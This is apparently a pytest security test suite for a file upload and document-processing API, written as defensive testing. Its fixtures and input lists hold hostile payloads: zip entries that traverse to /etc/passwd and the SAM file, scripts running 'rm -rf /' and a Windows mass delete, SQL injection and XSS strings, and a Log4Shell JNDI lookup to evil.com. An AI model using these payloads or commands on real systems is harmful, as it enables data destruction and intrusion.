"""
Security tests for file upload and processing functionality.
Tests Requirements: 2.1, 2.2, 2.4
"""

import pytest
import tempfile
import zipfile
import os
from pathlib import Path
from httpx import AsyncClient
from unittest.mock import patch, MagicMock

from src.main import app


class TestFileUploadSecurity:
    """Test security aspects of file upload and processing."""

    @pytest.fixture
    async def client(self):
        """Create test client."""
        async with AsyncClient(app=app, base_url="http://test") as ac:
            yield ac

    @pytest.fixture
    def malicious_zip_bomb(self):
        """Create a ZIP bomb for testing."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as f:
            with zipfile.ZipFile(f.name, 'w', zipfile.ZIP_DEFLATED) as zf:
                # Create a large file that compresses well (ZIP bomb)
                large_content = "A" * (10 * 1024 * 1024)  # 10MB of 'A's
                for i in range(10):  # 10 files = 100MB uncompressed
                    zf.writestr(f"bomb_{i}.txt", large_content)
            return Path(f.name)

    @pytest.fixture
    def path_traversal_zip(self):
        """Create ZIP with path traversal attempts."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as f:
            with zipfile.ZipFile(f.name, 'w') as zf:
                # Attempt path traversal attacks
                zf.writestr("../../../etc/passwd", "malicious content")
                zf.writestr("..\\..\\windows\\system32\\config\\sam", "malicious content")
                zf.writestr("legitimate.txt", "normal content")
            return Path(f.name)

    @pytest.fixture
    def executable_zip(self):
        """Create ZIP containing executable files."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as f:
            with zipfile.ZipFile(f.name, 'w') as zf:
                # Add various executable file types
                zf.writestr("malware.exe", b"MZ\x90\x00")  # PE header
                zf.writestr("script.sh", "#!/bin/bash\nrm -rf /")
                zf.writestr("script.bat", "@echo off\ndel /f /s /q C:\\*")
                zf.writestr("document.pdf", "%PDF-1.4 legitimate content")
            return Path(f.name)

    @pytest.mark.asyncio
    async def test_file_type_validation(self, client):
        """Test that only allowed file types are accepted."""
        
        # Test allowed file types
        allowed_types = [
            ("document.pdf", "application/pdf"),
            ("image.png", "image/png"),
            ("image.jpg", "image/jpeg"),
            ("archive.zip", "application/zip"),
            ("document.txt", "text/plain")
        ]
        
        for filename, content_type in allowed_types:
            response = await client.post(
                "/v1/upload/presigned-url",
                json={
                    "filename": filename,
                    "content_type": content_type,
                    "user_id": "test-user"
                }
            )
            assert response.status_code == 200, f"Should allow {content_type}"
        
        # Test disallowed file types
        disallowed_types = [
            ("malware.exe", "application/x-executable"),
            ("script.sh", "application/x-sh"),
            ("script.bat", "application/x-bat"),
            ("library.dll", "application/x-msdownload"),
            ("config.ini", "text/plain")  # Some text files might be restricted
        ]
        
        for filename, content_type in disallowed_types:
            response = await client.post(
                "/v1/upload/presigned-url",
                json={
                    "filename": filename,
                    "content_type": content_type,
                    "user_id": "test-user"
                }
            )
            # Should either reject or sanitize
            if response.status_code != 200:
                assert response.status_code in [400, 403], f"Should reject {content_type}"

    @pytest.mark.asyncio
    async def test_file_size_limits(self, client):
        """Test file size validation and limits."""
        
        # Test normal file size
        response = await client.post(
            "/v1/upload/presigned-url",
            json={
                "filename": "normal.pdf",
                "content_type": "application/pdf",
                "user_id": "test-user",
                "file_size": 5 * 1024 * 1024  # 5MB
            }
        )
        assert response.status_code == 200
        
        # Test oversized file
        response = await client.post(
            "/v1/upload/presigned-url",
            json={
                "filename": "huge.pdf",
                "content_type": "application/pdf",
                "user_id": "test-user",
                "file_size": 500 * 1024 * 1024  # 500MB
            }
        )
        assert response.status_code == 400
        error_data = response.json()
        assert "FILE_TOO_LARGE" in error_data.get("error_code", "")

    @pytest.mark.asyncio
    async def test_zip_bomb_protection(self, client, malicious_zip_bomb):
        """Test protection against ZIP bomb attacks."""
        
        with patch('src.storage.policy.upload_file_to_storage') as mock_upload, \
             patch('workers.src.tasks.archive.process_archive_task.delay') as mock_archive_task:
            
            mock_upload.return_value = "https://storage.example.com/zip-bomb.zip"
            
            # Mock archive task to simulate ZIP bomb detection
            def mock_archive_processing(*args, **kwargs):
                # Simulate detection of ZIP bomb during processing
                raise Exception("ZIP_BOMB_DETECTED: Compressed ratio exceeds safety limits")
            
            mock_archive_task.side_effect = mock_archive_processing
            
            # Attempt to process ZIP bomb
            response = await client.post(
                "/v1/tasks",
                json={
                    "file_urls": ["https://storage.example.com/zip-bomb.zip"],
                    "user_id": "test-user",
                    "options": {"enable_vectorization": False}
                }
            )
            
            # Should either reject immediately or fail during processing
            if response.status_code == 201:
                # If accepted, should fail during processing
                task_data = response.json()
                task_id = task_data["task_id"]
                
                # Check that task eventually fails
                with patch('src.database.repositories.TaskRepository.get_by_id') as mock_get_task:
                    from src.database.models import Task, TaskStatus
                    
                    failed_task = Task(
                        id=task_id,
                        user_id="test-user",
                        status=TaskStatus.FAILED,
                        error_message="ZIP_BOMB_DETECTED: Compressed ratio exceeds safety limits"
                    )
                    mock_get_task.return_value = failed_task
                    
                    status_response = await client.get(f"/v1/tasks/{task_id}/status")
                    assert status_response.status_code == 200
                    status_data = status_response.json()
                    assert status_data["status"] == "failed"
                    assert "ZIP_BOMB" in status_data.get("error_message", "")

    @pytest.mark.asyncio
    async def test_path_traversal_protection(self, client, path_traversal_zip):
        """Test protection against path traversal attacks in ZIP files."""
        
        with patch('src.storage.policy.upload_file_to_storage') as mock_upload, \
             patch('workers.src.tasks.archive.process_archive_task.delay') as mock_archive_task:
            
            mock_upload.return_value = "https://storage.example.com/path-traversal.zip"
            
            # Mock archive task to simulate path traversal detection
            def mock_archive_processing(*args, **kwargs):
                raise Exception("PATH_TRAVERSAL_DETECTED: Malicious file paths found in archive")
            
            mock_archive_task.side_effect = mock_archive_processing
            
            # Attempt to process malicious ZIP
            response = await client.post(
                "/v1/tasks",
                json={
                    "file_urls": ["https://storage.example.com/path-traversal.zip"],
                    "user_id": "test-user",
                    "options": {"enable_vectorization": False}
                }
            )
            
            # Should detect and reject path traversal attempts
            if response.status_code == 201:
                task_data = response.json()
                task_id = task_data["task_id"]
                
                with patch('src.database.repositories.TaskRepository.get_by_id') as mock_get_task:
                    from src.database.models import Task, TaskStatus
                    
                    failed_task = Task(
                        id=task_id,
                        user_id="test-user",
                        status=TaskStatus.FAILED,
                        error_message="PATH_TRAVERSAL_DETECTED: Malicious file paths found in archive"
                    )
                    mock_get_task.return_value = failed_task
                    
                    status_response = await client.get(f"/v1/tasks/{task_id}/status")
                    status_data = status_response.json()
                    assert status_data["status"] == "failed"
                    assert "PATH_TRAVERSAL" in status_data.get("error_message", "")

    @pytest.mark.asyncio
    async def test_executable_file_filtering(self, client, executable_zip):
        """Test filtering of executable files in ZIP archives."""
        
        with patch('src.storage.policy.upload_file_to_storage') as mock_upload, \
             patch('workers.src.tasks.archive.process_archive_task.delay') as mock_archive_task:
            
            mock_upload.return_value = "https://storage.example.com/executable.zip"
            
            # Mock successful archive processing with filtered files
            mock_task_result = MagicMock()
            mock_task_result.id = "filtered-task-123"
            mock_archive_task.return_value = mock_task_result
            
            response = await client.post(
                "/v1/tasks",
                json={
                    "file_urls": ["https://storage.example.com/executable.zip"],
                    "user_id": "test-user",
                    "options": {"enable_vectorization": False}
                }
            )
            assert response.status_code == 201
            
            # Verify that only safe files are processed
            # Mock the result to show filtered files
            with patch('src.database.repositories.TaskRepository.get_by_id') as mock_get_task:
                from src.database.models import Task, TaskStatus
                
                completed_task = Task(
                    id="filtered-task-123",
                    user_id="test-user",
                    status=TaskStatus.COMPLETED,
                    results={
                        "processed_files": ["document.pdf"],  # Only safe file
                        "filtered_files": ["malware.exe", "script.sh", "script.bat"],
                        "filter_reason": "Executable files not allowed"
                    }
                )
                mock_get_task.return_value = completed_task
                
                results_response = await client.get("/v1/tasks/filtered-task-123/results")
                results_data = results_response.json()
                
                # Should only process safe files
                assert "document.pdf" in results_data["processed_files"]
                assert len(results_data["filtered_files"]) == 3
                assert "malware.exe" in results_data["filtered_files"]

    @pytest.mark.asyncio
    async def test_input_sanitization(self, client):
        """Test input sanitization and validation."""
        
        # Test SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE tasks; --",
            "1' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            response = await client.post(
                "/v1/tasks",
                json={
                    "file_urls": ["https://storage.example.com/test.pdf"],
                    "user_id": malicious_input,  # Inject malicious input
                    "options": {"enable_vectorization": False}
                }
            )
            
            # Should either sanitize or reject
            if response.status_code == 201:
                # If accepted, verify sanitization occurred
                task_data = response.json()
                assert malicious_input not in str(task_data)
            else:
                # Should reject with validation error
                assert response.status_code in [400, 422]

    @pytest.mark.asyncio
    async def test_rate_limiting(self, client):
        """Test rate limiting protection."""
        
        # Simulate rapid requests from same user
        user_id = "rate-limit-test-user"
        requests_count = 100
        
        responses = []
        for i in range(requests_count):
            response = await client.post(
                "/v1/upload/presigned-url",
                json={
                    "filename": f"test-{i}.pdf",
                    "content_type": "application/pdf",
                    "user_id": user_id
                }
            )
            responses.append(response.status_code)
        
        # Should start rate limiting after certain threshold
        rate_limited_responses = [r for r in responses if r == 429]
        
        # If rate limiting is implemented, should see 429 responses
        if rate_limited_responses:
            assert len(rate_limited_responses) > 0, "Rate limiting should be triggered"
            print(f"Rate limiting triggered after {responses.index(429)} requests")

    @pytest.mark.asyncio
    async def test_authentication_bypass_attempts(self, client):
        """Test protection against authentication bypass attempts."""
        
        # Test accessing endpoints without proper authentication
        protected_endpoints = [
            ("/v1/tasks", "POST"),
            ("/v1/tasks/test-task-id", "GET"),
            ("/v1/upload/presigned-url", "POST")
        ]
        
        for endpoint, method in protected_endpoints:
            if method == "GET":
                response = await client.get(endpoint)
            else:
                response = await client.post(endpoint, json={})
            
            # Should require authentication (if implemented)
            # For now, just verify endpoints exist and handle requests properly
            assert response.status_code in [200, 201, 400, 401, 403, 422], f"Endpoint {endpoint} should handle requests properly"

    @pytest.mark.asyncio
    async def test_resource_exhaustion_protection(self, client):
        """Test protection against resource exhaustion attacks."""
        
        # Test extremely large JSON payloads
        large_payload = {
            "file_urls": ["https://storage.example.com/test.pdf"] * 10000,  # Very large array
            "user_id": "resource-test-user",
            "options": {"enable_vectorization": False}
        }
        
        response = await client.post("/v1/tasks", json=large_payload)
        
        # Should either reject large payloads or handle them gracefully
        if response.status_code != 201:
            assert response.status_code in [400, 413, 422], "Should reject oversized payloads"
        
        # Test deeply nested JSON
        nested_payload = {"data": {}}
        current = nested_payload["data"]
        for i in range(1000):  # Create deep nesting
            current["nested"] = {}
            current = current["nested"]
        
        response = await client.post("/v1/tasks", json=nested_payload)
        assert response.status_code in [400, 422], "Should reject deeply nested JSON"


class TestProcessingSecurity:
    """Test security aspects of document processing."""

    @pytest.fixture
    async def client(self):
        """Create test client."""
        async with AsyncClient(app=app, base_url="http://test") as ac:
            yield ac

    @pytest.mark.asyncio
    async def test_llm_prompt_injection_protection(self, client):
        """Test protection against LLM prompt injection attacks."""
        
        with patch('src.storage.policy.upload_file_to_storage') as mock_upload, \
             patch('workers.src.tasks.parsing.parse_document_task.delay') as mock_parse_task:
            
            mock_upload.return_value = "https://storage.example.com/injection-test.pdf"
            
            # Mock LLM response that might contain injection attempts
            def mock_llm_processing(*args, **kwargs):
                # Simulate detection of prompt injection
                raise Exception("PROMPT_INJECTION_DETECTED: Malicious prompt patterns found")
            
            mock_parse_task.side_effect = mock_llm_processing
            
            response = await client.post(
                "/v1/tasks",
                json={
                    "file_urls": ["https://storage.example.com/injection-test.pdf"],
                    "user_id": "injection-test-user",
                    "options": {"enable_vectorization": False}
                }
            )
            
            # Should detect and handle prompt injection attempts
            if response.status_code == 201:
                task_data = response.json()
                task_id = task_data["task_id"]
                
                with patch('src.database.repositories.TaskRepository.get_by_id') as mock_get_task:
                    from src.database.models import Task, TaskStatus
                    
                    failed_task = Task(
                        id=task_id,
                        user_id="injection-test-user",
                        status=TaskStatus.FAILED,
                        error_message="PROMPT_INJECTION_DETECTED: Malicious prompt patterns found"
                    )
                    mock_get_task.return_value = failed_task
                    
                    status_response = await client.get(f"/v1/tasks/{task_id}/status")
                    status_data = status_response.json()
                    assert "PROMPT_INJECTION" in status_data.get("error_message", "")

    @pytest.mark.asyncio
    async def test_output_sanitization(self, client):
        """Test sanitization of LLM outputs."""
        
        with patch('src.storage.policy.upload_file_to_storage') as mock_upload, \
             patch('workers.src.tasks.parsing.parse_document_task.delay') as mock_parse_task:
            
            mock_upload.return_value = "https://storage.example.com/output-test.pdf"
            mock_task_result = MagicMock()
            mock_task_result.id = "output-test-task"
            mock_parse_task.return_value = mock_task_result
            
            response = await client.post(
                "/v1/tasks",
                json={
                    "file_urls": ["https://storage.example.com/output-test.pdf"],
                    "user_id": "output-test-user",
                    "options": {"enable_vectorization": False}
                }
            )
            assert response.status_code == 201
            
            # Mock potentially malicious LLM output
            with patch('src.database.repositories.TaskRepository.get_by_id') as mock_get_task:
                from src.database.models import Task, TaskStatus
                
                completed_task = Task(
                    id="output-test-task",
                    user_id="output-test-user",
                    status=TaskStatus.COMPLETED,
                    results={
                        "extracted_content": {
                            "title": "<script>alert('xss')</script>",  # Malicious content
                            "content": "Normal content with ${jndi:ldap://evil.com/a} injection attempt"
                        }
                    }
                )
                mock_get_task.return_value = completed_task
                
                results_response = await client.get("/v1/tasks/output-test-task/results")
                results_data = results_response.json()
                
                # Should sanitize malicious content
                title = results_data["extracted_content"]["title"]
                content = results_data["extracted_content"]["content"]
                
                assert "<script>" not in title, "Should sanitize XSS attempts"
                assert "${jndi:" not in content, "Should sanitize injection attempts"